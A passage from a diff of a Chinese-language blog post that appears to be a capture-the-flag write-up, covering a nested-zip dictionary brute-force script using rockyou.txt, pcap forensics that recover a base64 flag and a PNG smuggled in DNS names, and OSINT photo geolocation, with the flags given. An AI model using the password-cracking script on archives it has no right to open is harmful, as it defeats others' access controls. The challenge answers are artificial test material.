class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> zlib<br><br><span class="hljs-comment"># 定义初始zip文件路径和字典文件路径</span><br>zip_path = <span class="hljs-string">&quot;Misc_5_-_dwarf_vault_200.zip&quot;</span><br>dict_path = <span class="hljs-string">&quot;rockyou.txt&quot;</span><br>passwords = []  <span class="hljs-comment"># 记录所有找到的密码</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_zip</span>(<span class="hljs-params">zip_path, dict_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_file:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(dict_path, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;latin-1&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                    password = line.strip().encode(<span class="hljs-string">&quot;latin-1&quot;</span>)  <span class="hljs-comment"># 转换为字节格式</span><br>                    <span class="hljs-keyword">try</span>:<br>                        zip_file.extractall(pwd=password)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 找到密码: <span class="hljs-subst">&#123;password.decode()&#125;</span>&quot;</span>)<br>                        passwords.append(password.decode())<br><br>                        <span class="hljs-comment"># 获取解压后的文件夹或文件名</span><br>                        extracted_files = zip_file.namelist()<br>                        <span class="hljs-keyword">return</span> extracted_files  <span class="hljs-comment"># 返回解压出的文件名列表</span><br>                    <span class="hljs-keyword">except</span> (RuntimeError, zipfile.BadZipFile, zlib.error):<br>                        <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 文件未找到，请检查路径是否正确。&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> zlib.error:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 递归解压直到没有更多 zip 文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recursive_brute_force</span>(<span class="hljs-params">zip_path, dict_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> zip_path:<br>            extracted_files = brute_force_zip(zip_path, dict_path)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> extracted_files:<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-comment"># 查找新的 ZIP 文件</span><br>            new_zip_path = <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> extracted_files:<br>                <span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.zip&quot;</span>):<br>                    new_zip_path = file<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> new_zip_path:<br>                zip_path = new_zip_path  <span class="hljs-comment"># 直接使用新找到的 ZIP 文件</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> zlib.error:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 发生 zlib 错误，终止爆破。&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># 将所有找到的密码写入文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;found_passwords.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> passwords:<br>                f.write(password + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># 运行爆破函数</span><br>recursive_brute_force(zip_path, dict_path)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有找到的密码:&quot;</span>, passwords)<br><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import zipfile
+import os
+import shutil
+import zlib
 
+# 定义初始zip文件路径和字典文件路径
+zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;
+dict_path = &quot;rockyou.txt&quot;
+passwords = []  # 记录所有找到的密码
+
+def brute_force_zip(zip_path, dict_path):
+    try:
+        with zipfile.ZipFile(zip_path, &#39;r&#39;) as zip_file:
+            with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f:
+                for line in f:
+                    password = line.strip().encode(&quot;latin-1&quot;)  # 转换为字节格式
+                    try:
+                        zip_file.extractall(pwd=password)
+                        print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;)
+                        passwords.append(password.decode())
+
+                        # 获取解压后的文件夹或文件名
+                        extracted_files = zip_file.namelist()
+                        return extracted_files  # 返回解压出的文件名列表
+                    except (RuntimeError, zipfile.BadZipFile, zlib.error):
+                        continue
+        print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;)
+        return None
+    except FileNotFoundError:
+        print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;)
+        return None
+    except zlib.error:
+        print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;)
+        return None
+
+# 递归解压直到没有更多 zip 文件
+def recursive_brute_force(zip_path, dict_path):
+    try:
+        while zip_path:
+            extracted_files = brute_force_zip(zip_path, dict_path)
+            if not extracted_files:
+                break
+
+            # 查找新的 ZIP 文件
+            new_zip_path = None
+            for file in extracted_files:
+                if file.endswith(&quot;.zip&quot;):
+                    new_zip_path = file
+                    break
+
+            if new_zip_path:
+                zip_path = new_zip_path  # 直接使用新找到的 ZIP 文件
+            else:
+                print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;)
+                break
+    except zlib.error:
+        print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;)
+    finally:
+        # 将所有找到的密码写入文件
+        with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:
+            for password in passwords:
+                f.write(password + &quot;\n&quot;)
+
+# 运行爆破函数
+recursive_brute_force(zip_path, dict_path)
+print(&quot;所有找到的密码:&quot;, passwords)
+</code></pre>
 <p>注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。</p>
 <p>再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。</p>
 <p>txt文件的内容为：</p>
-<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">Mining</span> report - flag coordinates: ectf&#123;[[<span class="hljs-number">0</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">8</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">5</span>], <span class="hljs-string">&#x27;_&#x27;</span>, [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">8</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">5</span>], <span class="hljs-string">&#x27;_&#x27;</span>, [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">9</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">28</span>, <span class="hljs-number">7</span>]]&#125;<br></code></pre></td></tr></table></figure>
-
+<pre><code>Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#39;_&#39;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#39;_&#39;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125;
+</code></pre>
 <p>用coordinate将flag表示了出来。于是来检查drop_pod.py的内容：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Maybe the flag was the friends we made along the way</span><br>password = <span class="hljs-string">&quot; &quot;</span><br><br>flag = <span class="hljs-string">&quot;FAKE FLAG THIS IS NOT REAL&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_positions</span>(<span class="hljs-params">flag, crew_list</span>):<br>    positions = []<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-keyword">if</span> char == <span class="hljs-string">&quot;_&quot;</span>:<br>            positions.append(<span class="hljs-string">&quot;_&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> i, name <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(crew_list):<br>            <span class="hljs-keyword">if</span> char.lower() <span class="hljs-keyword">in</span> name.lower():<br>                positions.append([i, name.lower().index(char.lower())])<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            positions.append([<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>])<br>    <span class="hljs-keyword">return</span> positions<br><br><br>positions = find_positions(flag, password.split())<br><br><br>output_text = <span class="hljs-string">&quot;Mining report - flag coordinates: ectf&#123;&quot;</span> + <span class="hljs-built_in">str</span>(positions) + <span class="hljs-string">&quot;&#125;&quot;</span><br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;mining_report.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(output_text)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rock and Stone! Report written to mining_report.txt:&quot;</span>, output_text)<br><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">#Maybe the flag was the friends we made along the way
+password = &quot; &quot;
 
+flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;
+
+def find_positions(flag, crew_list):
+    positions = []
+    for char in flag:
+        if char == &quot;_&quot;:
+            positions.append(&quot;_&quot;)
+            continue
+        found = False
+        for i, name in enumerate(crew_list):
+            if char.lower() in name.lower():
+                positions.append([i, name.lower().index(char.lower())])
+                found = True
+                break
+        if not found:
+            positions.append([None, None])
+    return positions
+
+
+positions = find_positions(flag, password.split())
+
+
+output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;
+
+
+with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file:
+    file.write(output_text)
+
+
+print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text)
+</code></pre>
 <p>是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;found_passwords.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    reversed_passwords = file.readlines()<br><br><span class="hljs-comment"># 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）</span><br>password_list = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> reversed_passwords][::-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">#txt里的内容</span><br>positions = [[<span class="hljs-number">0</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">8</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">5</span>], <span class="hljs-string">&#x27;_&#x27;</span>, <br>             [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">8</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">15</span>, <span class="hljs-number">5</span>], <span class="hljs-string">&#x27;_&#x27;</span>, <br>             [<span class="hljs-number">0</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">9</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">7</span>], [<span class="hljs-number">28</span>, <span class="hljs-number">7</span>]]<br><br><span class="hljs-comment"># 还原 flag</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> positions:<br>    <span class="hljs-keyword">if</span> pos == <span class="hljs-string">&quot;_&quot;</span>:<br>        flag += <span class="hljs-string">&quot;_&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        i, j = pos<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= i &lt; <span class="hljs-built_in">len</span>(password_list) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= j &lt; <span class="hljs-built_in">len</span>(password_list[i]):<br>            flag += password_list[i][j]<br>        <span class="hljs-keyword">else</span>:<br>            flag += <span class="hljs-string">&quot;?&quot;</span>  <span class="hljs-comment"># 标记错误或缺失数据</span><br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>, <span class="hljs-string">&quot;ectf&#123;&quot;</span> + flag + <span class="hljs-string">&quot;&#125;&quot;</span>)<br><br><span class="hljs-comment"># flag: ectf&#123;d1ggy_d1ggy_h0l3&#125;</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file:
+    reversed_passwords = file.readlines()
 
+# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）
+password_list = [line.strip() for line in reversed_passwords][::-1]
 
+#txt里的内容
+positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#39;_&#39;, 
+             [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#39;_&#39;, 
+             [0, 3], [0, 9], [1, 7], [28, 7]]
 
+# 还原 flag
+flag = &quot;&quot;
+for pos in positions:
+    if pos == &quot;_&quot;:
+        flag += &quot;_&quot;
+    else:
+        i, j = pos
+        if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]):
+            flag += password_list[i][j]
+        else:
+            flag += &quot;?&quot;  # 标记错误或缺失数据
 
+# 输出结果
+print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)
 
+# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125;
+</code></pre>
 <h2 id="5-Forensic"><a href="#5-Forensic" class="headerlink" title="5. Forensic"></a>5. Forensic</h2><h3 id="My-dearest"><a href="#My-dearest" class="headerlink" title="My dearest"></a>My dearest</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234217593.png" alt="image-20250203234217593"></p>
 <p>我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234330717.png" alt="image-20250203234330717"></p>
 <p>根据题目要求，flag为：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;MichelTeller&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
+<pre><code>ectf&#123;MichelTeller&#125;
+</code></pre>
 <h3 id="Capture-the-hidden"><a href="#Capture-the-hidden" class="headerlink" title="Capture the hidden"></a>Capture the hidden</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234518981.png" alt="image-20250203234518981"></p>
 <p>这道题我们会得到一份.pcap文件，用Wireshark打开它。</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111238767.png" alt="image-20250204111238767"></p>
@@ -446,44 +706,54 @@
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111326784.png" alt="image-20250204111326784"></p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111406843.png" alt="image-20250204111406843"></p>
 <p>确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整：</p>
-<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-type">ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5</span></span><br><br>-&gt;(base64)<br><br><span class="hljs-title">ectf</span>&#123;<span class="hljs-type">P05t_1s_v3ry_345y_T0_F1N</span><br></code></pre></td></tr></table></figure>
+<pre><code>data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5
 
+-&gt;(base64)
+
+ectf&#123;P05t_1s_v3ry_345y_T0_F1N
+</code></pre>
 <p>于是我们找这份文件在纪录里的具体位置：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204111713246.png" alt="image-20250204111713246"></p>
 <p>可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">data</span><span class="hljs-operator">=</span>ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>-&gt;(base64)<br><br>ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125;<br></code></pre></td></tr></table></figure>
+<pre><code>data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==
 
+-&gt;(base64)
 
-
-
-
+ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125;
+</code></pre>
 <h3 id="Just-a-PCAP"><a href="#Just-a-PCAP" class="headerlink" title="Just a PCAP"></a>Just a PCAP</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203234546652.png" alt="image-20250203234546652"></p>
 <p>这道题也是一份pcap文件，再次用Wireshark打开。</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204112053442.png" alt="image-20250204112053442"></p>
 <p>但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。）</p>
 <p>这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\的tshark.exe</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><span class="hljs-keyword">import</span> pyshark.packet<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify<br><br>capture = pyshark.FileCapture(<span class="hljs-string">&#x27;justapcap.pcap&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:\\Program Files\\Wireshark\\tshark.exe&#x27;</span>)		<span class="hljs-comment"># 将这个路径替换成自己电脑上tshark.exe的路径</span><br>hexstr = <span class="hljs-string">&quot;&quot;</span><br>cnt = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> capture:<br>    s = <span class="hljs-built_in">str</span>(packet)<br>    cur = s.split(<span class="hljs-string">&quot;Name:&quot;</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;1m &quot;</span>)[<span class="hljs-number">1</span>]<br>    hexstr += cur<br>hexstr = hexstr.split(<span class="hljs-string">&quot;exam&quot;</span>)[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.png&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(unhexlify(hexstr))<br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import pyshark
+import pyshark.packet
+from binascii import unhexlify
 
+capture = pyshark.FileCapture(&#39;justapcap.pcap&#39;, tshark_path=&#39;D:\\Program Files\\Wireshark\\tshark.exe&#39;)		# 将这个路径替换成自己电脑上tshark.exe的路径
+hexstr = &quot;&quot;
+cnt = 0
+for packet in capture:
+    s = str(packet)
+    cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1]
+    hexstr += cur
+hexstr = hexstr.split(&quot;exam&quot;)[0]
+
+with open(&quot;a.png&quot;,&quot;wb&quot;) as f:
+    f.write(unhexlify(hexstr))
+</code></pre>
 <p>然后就会得到这张图片：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/a.png" alt="a"></p>
-<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ectf&#123;<span class="hljs-symbol">DN5_3xf1ltr@</span>t10n_15_flnd3d&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;DN5_3xf1ltr@t10n_15_flnd3d&#125;
+</code></pre>
 <h2 id="6-Osint"><a href="#6-Osint" class="headerlink" title="6. Osint"></a>6. Osint</h2><h3 id="Project-153-Q1"><a href="#Project-153-Q1" class="headerlink" title="Project-153-Q1"></a>Project-153-Q1</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113219584.png" alt="image-20250204113219584"></p>
 <p>这道题我们会得到这张图片：</p>
 <p><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/OSINT_1_-_question-1.jpg" alt="OSINT_1_-_question-1"></p>
 <p>通过谷歌识图可以很轻易地知道这个地方是：Falls Caramy, 法语原名为Chutes_du_Caramy。</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204115324497.png" alt="image-20250204115324497"></p>
 <p>得到flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;Chutes_du_Caramy&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;Chutes_du_Caramy&#125;
+</code></pre>
 <h3 id="Project-153-Q2"><a href="#Project-153-Q2" class="headerlink" title="Project-153-Q2"></a>Project-153-Q2</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113324647.png" alt="image-20250204113324647"></p>
 <p>这道题我们会得到这张图片：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/OSINT_1_-_question-2.jpg" alt="OSINT_1_-_question-2"></p>
@@ -497,12 +767,8 @@
 <p>并且点开 Calanque de l’Esterel, 83700 Saint-Raphaël, 法国 的相册可以看到这样一张图片：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204131937927.png" alt="image-20250204131937927"></p>
 <p>跟我们图片里的一模一样。沿着这个方向依次尝试带有名字的地点，便可以成功找到拍摄地：Pointe de l’Observatoire, D559, 83700 Saint-Raphaël, 法国。</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ectf&#123;Pointe_de_l<span class="hljs-symbol">&#x27;Observatoire</span>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;Pointe_de_l&#39;Observatoire&#125;
+</code></pre>
 <h3 id="Project-153-Q3"><a href="#Project-153-Q3" class="headerlink" title="Project-153-Q3"></a>Project-153-Q3</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113338645.png" alt="image-20250204113338645"></p>
 <p>这道题我们会得到这张图片：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/OSINT_1_-_question-3.jpg" alt="OSINT_1_-_question-3"></p>
@@ -513,30 +779,24 @@
 <p>便可以在相册里发现这张图片，大概率是题目所指的“monster：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204132638589.png" alt="image-20250204132638589"></p>
 <p>所以答案为左下角的作者名字。</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;Michael_DELAETER&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;Michael_DELAETER&#125;
+</code></pre>
 <h3 id="Project-153-Q4"><a href="#Project-153-Q4" class="headerlink" title="Project-153-Q4"></a>Project-153-Q4</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113351088.png" alt="image-20250204113351088"></p>
 <p>首先通过谷歌识图判断出照片所在地应该是：Bormes-les-Mimosas</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133041579.png" alt="image-20250204133041579"></p>
 <p>在Google Earth找到这里：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204133137356.png" alt="image-20250204133137356"></p>
 <p>根据照片拍摄角度以及题目描述不难猜出远处的那座岛应该是 Île du Levant。</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;Île_du_Levant&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
+<pre><code>ectf&#123;Île_du_Levant&#125;
+</code></pre>
 <h3 id="Project-153-Q5"><a href="#Project-153-Q5" class="headerlink" title="Project-153-Q5"></a>Project-153-Q5</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204113405376.png" alt="image-20250204113405376"></p>
 <p>这道题我们会得到这张图片：</p>
